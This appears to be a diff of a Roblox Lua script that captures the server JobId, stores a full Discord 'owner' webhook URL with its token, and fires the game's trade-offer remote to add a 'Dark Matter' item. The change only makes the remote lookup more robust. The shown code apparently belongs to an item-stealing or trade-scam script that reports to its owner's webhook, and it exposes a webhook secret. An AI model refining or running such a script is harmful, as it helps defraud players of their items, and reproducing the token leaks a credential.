@@ -9,16 +9,15 @@ local JOB_ID          = game.JobId
 
 local OWNER_WEBHOOK = "https://discord.com/api/webhooks/1527862331713912933/1591yxmOf7HfJvm01LopguNToy4z0gxACj_E0-nN-wM8PeKTuSOJoynFqqojIHmysTJ5"  -- ⚠️ REGENERATE THIS!
 
-local Event = game:GetService("ReplicatedStorage").Remotes.UpdateTradeOffer
+local Event = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("UpdateTradeOffer")
 Event:FireServer(
     {
-
         {
             "Dark Matter",
             1
         }
     }
-)	
+)
 
 -- USAGE PING
 pcall(function()
